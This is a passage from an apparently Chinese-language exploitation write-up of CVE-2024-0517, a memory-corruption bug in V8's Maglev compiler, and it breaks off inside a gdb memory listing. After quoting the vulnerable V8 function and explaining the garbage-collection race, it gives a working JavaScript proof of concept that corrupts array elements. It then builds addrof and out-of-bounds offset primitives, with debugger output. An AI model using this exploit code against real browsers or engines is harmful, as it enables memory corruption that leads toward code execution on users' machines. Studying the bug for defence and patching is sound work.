class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MaglevGraphBuilder::TryBuildFindNonDefaultConstructorOrConstruct</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    ValueNode* this_function, ValueNode* new_target,</span></span></span><br><span class="line"><span class="params"><span class="function">    std::pair&lt;interpreter::Register, interpreter::Register&gt; result)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// See also:</span></span><br><span class="line">  <span class="comment">// JSNativeContextSpecialization::ReduceJSFindNonDefaultConstructorOrConstruct</span></span><br><span class="line"></span><br><span class="line">  compiler::OptionalHeapObjectRef maybe_constant =</span><br><span class="line">      <span class="built_in">TryGetConstant</span>(this_function);</span><br><span class="line">  <span class="keyword">if</span> (!maybe_constant) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  compiler::MapRef function_map = maybe_constant-&gt;<span class="built_in">map</span>(<span class="built_in">broker</span>());</span><br><span class="line">  compiler::HeapObjectRef current = function_map.<span class="built_in">prototype</span>(<span class="built_in">broker</span>());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// TODO(v8:13091): Don&#x27;t produce incomplete stack traces when debug is active.</span></span><br><span class="line">  <span class="comment">// We already deopt when a breakpoint is set. But it would be even nicer to</span></span><br><span class="line">  <span class="comment">// avoid producting incomplete stack traces when when debug is active, even if</span></span><br><span class="line">  <span class="comment">// there are no breakpoints - then a user inspecting stack traces via Dev</span></span><br><span class="line">  <span class="comment">// Tools would always see the full stack trace.</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!current.<span class="built_in">IsJSFunction</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    compiler::JSFunctionRef current_function = current.<span class="built_in">AsJSFunction</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are class fields, bail out. TODO(v8:13091): Handle them here.</span></span><br><span class="line">    <span class="keyword">if</span> (current_function.<span class="built_in">shared</span>(<span class="built_in">broker</span>())</span><br><span class="line">            .<span class="built_in">requires_instance_members_initializer</span>()) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are private methods, bail out. TODO(v8:13091): Handle them here.</span></span><br><span class="line">    <span class="keyword">if</span> (current_function.<span class="built_in">context</span>(<span class="built_in">broker</span>())</span><br><span class="line">            .<span class="built_in">scope_info</span>(<span class="built_in">broker</span>())</span><br><span class="line">            .<span class="built_in">ClassScopeHasPrivateBrand</span>()) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FunctionKind kind = current_function.<span class="built_in">shared</span>(<span class="built_in">broker</span>()).<span class="built_in">kind</span>();</span><br><span class="line">    <span class="keyword">if</span> (kind != FunctionKind::kDefaultDerivedConstructor) &#123;</span><br><span class="line">      <span class="comment">// The hierarchy walk will end here; this is the last change to bail out</span></span><br><span class="line">      <span class="comment">// before creating new nodes.</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">broker</span>()-&gt;<span class="built_in">dependencies</span>()-&gt;<span class="built_in">DependOnArrayIteratorProtector</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      compiler::OptionalHeapObjectRef new_target_function =</span><br><span class="line">          <span class="built_in">TryGetConstant</span>(new_target);</span><br><span class="line">      <span class="keyword">if</span> (kind == FunctionKind::kDefaultBaseConstructor) &#123;</span><br><span class="line">        <span class="comment">// Store the result register first, so that a lazy deopt in</span></span><br><span class="line">        <span class="comment">// `FastNewObject` writes `true` to this register.</span></span><br><span class="line">        <span class="built_in">StoreRegister</span>(result.first, <span class="built_in">GetBooleanConstant</span>(<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">        ValueNode* object;</span><br><span class="line">        <span class="keyword">if</span> (new_target_function &amp;&amp; new_target_function-&gt;<span class="built_in">IsJSFunction</span>() &amp;&amp;</span><br><span class="line">            <span class="built_in">HasValidInitialMap</span>(new_target_function-&gt;<span class="built_in">AsJSFunction</span>(),</span><br><span class="line">                               current_function)) &#123;</span><br><span class="line">          object = <span class="built_in">BuildAllocateFastObject</span>(</span><br><span class="line">              <span class="built_in">FastObject</span>(new_target_function-&gt;<span class="built_in">AsJSFunction</span>(), <span class="built_in">zone</span>(), <span class="built_in">broker</span>()),</span><br><span class="line">              AllocationType::kYoung);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          object = <span class="built_in">BuildCallBuiltin</span>&lt;Builtin::kFastNewObject&gt;(</span><br><span class="line">              &#123;<span class="built_in">GetConstant</span>(current_function), new_target&#125;);</span><br><span class="line">          <span class="comment">// We&#x27;ve already stored &quot;true&quot; into result.first, so a deopt here just</span></span><br><span class="line">          <span class="comment">// has to store result.second. Also mark result.first as being used,</span></span><br><span class="line">          <span class="comment">// since the lazy deopt frame won&#x27;t have marked it since it used to be</span></span><br><span class="line">          <span class="comment">// a result register.</span></span><br><span class="line">          current_interpreter_frame_.<span class="built_in">get</span>(result.first)-&gt;<span class="built_in">add_use</span>();</span><br><span class="line">          object-&gt;<span class="built_in">lazy_deopt_info</span>()-&gt;<span class="built_in">UpdateResultLocation</span>(result.second, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">StoreRegister</span>(result.second, object);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">StoreRegister</span>(result.first, <span class="built_in">GetBooleanConstant</span>(<span class="literal">false</span>));</span><br><span class="line">        <span class="built_in">StoreRegister</span>(result.second, <span class="built_in">GetConstant</span>(current));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">broker</span>()-&gt;<span class="built_in">dependencies</span>()-&gt;<span class="built_in">DependOnStablePrototypeChain</span>(</span><br><span class="line">          function_map, WhereToStart::kStartAtReceiver, current_function);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Keep walking up the class tree.</span></span><br><span class="line">    current = current_function.<span class="built_in">map</span>(<span class="built_in">broker</span>()).<span class="built_in">prototype</span>(<span class="built_in">broker</span>());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的本质就是遍历正在构造对象的原型链，以便找出的一个非默认构造函数，并利用该信息来构造对象实例。为了确保漏洞利用条件，我们可以先看一下这个函数。</p><p>首先在开头我们可以发现被构造实例的对象必须是”常量”。而后面则开始遍历原型链。循环中的<strong>current_function</strong>保存当前父对象的构造函数，若某个父类构造函数并非函数类型，则循环会终止。</p><p>后面则会通过<code>FunctionKind</code>枚举来判断当前父类构造函数的类型，若为默认派生构造函数，则会跳转至结尾，反之则会进入处理非默认构造函数的代码块。之后会有一个关键操作就是验证<code>new.target</code>的常量性，之后会进一步确定其是否是有效常量，若是则会通过条件，之后便会调用函数<code>BuildAllocateFastObject(new_target)</code>，该函数内部会调用<code>ExtendOrReallocateCurrentRawAllocation(int size, AllocationType allocation_type)</code>函数，而在调用<code>BuildAllocateFastObject()</code>函数后，其不会清理<code>current_raw_allocation_</code>常量，那么如果原始分配和折叠分配的期间，触发了垃圾回收，就会导致越界读写。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>下面我们就可以开始进行对漏洞的利用了</p><h3 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h3><p>首先我们来写一段poc来了解一下该漏洞可以完成的操作以便后续来进行漏洞利用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> empty_object = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> empty_array = [];</span><br><span class="line"><span class="keyword">let</span> corrupted_instance = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> dogc_flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">let</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">let</span> u32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buffer);</span><br><span class="line"><span class="keyword">let</span> b64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dogc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (dogc_flag == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">900</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassParent</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassBug</span> <span class="keyword">extends</span> <span class="title class_ inherited__">ClassParent</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">a20, a21, a22</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> v24 = <span class="keyword">new</span> <span class="keyword">new</span>.<span class="title function_">target</span>();</span><br><span class="line">        <span class="keyword">let</span> x = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="keyword">let</span> a = [<span class="number">1.1</span>];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">x</span> = x;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">a</span> = a;</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(empty_array);</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="number">1</span>] = <span class="title function_">dogc</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">    dogc_flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) dogc_flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="title function_">dogc</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">650</span>; i++) &#123;</span><br><span class="line">    dogc_flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">644</span> || i == <span class="number">645</span> || i == <span class="number">646</span> || i == <span class="number">640</span>) &#123;</span><br><span class="line">        dogc_flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="title function_">dogc</span>();</span><br><span class="line">        dogc_flag = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">646</span>) dogc_flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="title class_">Reflect</span>.<span class="title function_">construct</span>(<span class="title class_">ClassBug</span>, empty_array, <span class="title class_">ClassParent</span>);</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">646</span>) &#123;</span><br><span class="line">        corrupted_instance = x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> x = corrupted_instance.<span class="property">x</span>;</span><br><span class="line"><span class="keyword">let</span> a = corrupted_instance.<span class="property">a</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(corrupted_instance);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(x);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在realse模式下执行该代码，并使用gdb查看布局结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">------- this -------</span><br><span class="line">DebugPrint: 0x25550030adad: [JS_OBJECT_TYPE] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x25550030a5f5 &lt;Map[20](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x2555001a3f69 &lt;ClassParent map = 0x25550030a59d&gt;</span><br><span class="line"> - elements: 0x255500202a29 &lt;FixedArray[19]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x2555000006a5 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x255500002af1: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#x: 0x25550030ad9d &lt;JSArray[8]&gt; (const data field 0), location: in-object</span></span><br><span class="line">    0x255500002981: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#a: 0x25550030add1 &lt;JSArray[1]&gt; (const data field 1), location: in-object</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x255500202a29 &lt;FixedArray[19]&gt; &#123;</span><br><span class="line">           0: 0x2555000006c1 &lt;the_hole_value&gt;</span><br><span class="line">           1: 0x255500000061 &lt;undefined&gt;</span><br><span class="line">        2-18: 0x2555000006c1 &lt;the_hole_value&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x25550030a5f5: [Map] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - <span class="built_in">type</span>: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 20</span><br><span class="line"> - inobject properties: 2</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x25550030a5c5 &lt;Map[20](HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x25550030a5ed &lt;Cell value= 0&gt;</span><br><span class="line"> - instance descriptors (own) <span class="comment">#2: 0x25550030a7c9 &lt;DescriptorArray[2]&gt;</span></span><br><span class="line"> - prototype: 0x2555001a3f69 &lt;ClassParent map = 0x25550030a59d&gt;</span><br><span class="line"> - constructor: 0x25550019ad25 &lt;JSFunction ClassParent (sfi = 0x255500199ecd)&gt;</span><br><span class="line"> - dependent code: 0x25550030ab1d &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">------- x array ----------</span><br><span class="line">DebugPrint: 0x25550030ad9d: [JSArray] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x25550018eea5 &lt;Map[16](PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x25550018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x25550030adc1 &lt;FixedDoubleArray[1]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 8</span><br><span class="line"> - properties: 0x2555000006a5 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x255500000cf1: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x255500025d29 &lt;AccessorInfo name= 0x255500000cf1 &lt;String[6]: #length&gt;, data= 0x255500000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x25550030adc1 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: -858993459</span><br><span class="line"> &#125;</span><br><span class="line">0x25550018eea5: [Map] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 16</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - elements kind: PACKED_ELEMENTS</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x25550018ee65 &lt;Map[16](HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x2555000009e1 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors <span class="comment">#1: 0x25550018edb1 &lt;DescriptorArray[1]&gt;</span></span><br><span class="line"> - transitions <span class="comment">#1: 0x25550018eecd &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x255500000db5 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_ELEMENTS) -&gt; 0x25550018eee5 &lt;Map[16](HOLEY_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x25550018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x25550018e56d &lt;JSFunction Array (sfi = 0x2555001c6155)&gt;</span><br><span class="line"> - dependent code: 0x2555000006b5 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">-------- a array -----------</span><br><span class="line">DebugPrint: 0x25550030add1: [JSArray] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x25550018ee25 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x25550018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x25550030adc1 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x2555000006a5 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x255500000cf1: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x255500025d29 &lt;AccessorInfo name= 0x255500000cf1 &lt;String[6]: #length&gt;, data= 0x255500000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x25550030adc1 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line"> &#125;</span><br><span class="line">0x25550018ee25: [Map] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 16</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x25550018ede5 &lt;Map[16](HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x2555000009e1 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors <span class="comment">#1: 0x25550018edb1 &lt;DescriptorArray[1]&gt;</span></span><br><span class="line"> - transitions <span class="comment">#1: 0x25550018ee4d &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x255500000db5 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x25550018ee65 &lt;Map[16](HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x25550018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x25550018e56d &lt;JSFunction Array (sfi = 0x2555001c6155)&gt;</span><br><span class="line"> - dependent code: 0x2555000006b5 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure><p>我们可以发现两者的elements是相同的，这就是因为在分配折叠之前发生了GC进一步导致了x数组的elements被覆盖为了a数组的elements，之后我们查看一下gdb里面的内存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">----- this ------</span><br><span class="line">0x25550030adac: 0x0030a5f5      0x000006a5      0x00202a29      0x0030ad9d</span><br><span class="line">0x25550030adbc: 0x0030add1      0x00000829      0x00000002      0x9999999a</span><br><span class="line">0x25550030adcc: 0x3ff19999      0x0018ee25      0x000006a5      0x0030adc1</span><br><span class="line">0x25550030addc: 0x00000002      0x001a3d89      0x001a3d89      0x00000565</span><br><span class="line">0x25550030adec: 0x00000028      0x0030ae41      0x00000000      0x0030ae6d</span><br><span class="line">0x25550030adfc: 0x000002f2      0x0000001a      0x0000000c      0x00199d65</span><br><span class="line">0x25550030ae0c: 0x00000e19      0x00000268      0x00000002      0x00000004</span><br><span class="line">0x25550030ae1c: 0x000002f2      0x00000000</span><br></pre></td></tr></table></figure><p>我们可以发现其内存布局如下</p><p><img src="/2025/01/18/CVE-2024-0517/cve-2024-0517.png" alt="cve-2024-0517"></p><h3 id="初始OOB"><a href="#初始OOB" class="headerlink" title="初始OOB"></a>初始OOB</h3><p>有了上述的结论之后我们就可以实现最初版本的OOB了。</p><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addrof_tmp</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    x[<span class="number">0</span>] = obj;</span><br><span class="line">    f64[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> u32[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="写入地址"><a href="#写入地址" class="headerlink" title="写入地址"></a>写入地址</h4><p>在写入的时候我们需要创建一个double类型的数组，然后对其进行操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> rwarr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">2.2</span>];</span><br><span class="line">dogc_flag = <span class="literal">true</span>;</span><br><span class="line"><span class="title function_">dogc</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> addr_a = <span class="title function_">addrof_tmp</span>(a);</span><br><span class="line"><span class="keyword">let</span> addr_rwarr = <span class="title function_">addrof_tmp</span>(rwarr);</span><br><span class="line">x[<span class="number">5</span>] = <span class="number">0x10000</span>;</span><br><span class="line"><span class="keyword">let</span> offset = (addr_rwarr - addr_a) + <span class="number">0xc</span>;</span><br><span class="line"><span class="keyword">if</span> ((offset % <span class="number">8</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    offset += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line">offset = offset / <span class="number">8</span>;</span><br><span class="line">offset += <span class="number">1</span>;</span><br><span class="line">offset -= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> mark  = offset;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(rwarr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mark is ==&gt; &quot;</span> , mark);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a [mark] is ==&gt; &quot;</span>, <span class="title function_">f2i</span>(a[mark]).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a[2] is ==&gt; &quot;</span>, <span class="title function_">f2i</span>(a[<span class="number">2</span>]).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码是计算<code>rwarr</code>数组的<code>elements</code>和 a数组数据区起始位置的偏移，运行上述代码然后我们使用gdb可以查看到如下内存布局</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 